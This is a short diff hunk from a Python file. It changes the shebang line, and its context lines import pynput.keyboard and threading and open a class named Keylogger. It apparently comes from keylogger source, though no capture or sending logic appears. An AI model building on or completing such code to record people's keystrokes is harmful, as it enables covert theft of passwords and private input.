@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/python
 import pynput.keyboard
 import threading
 class Keylogger:
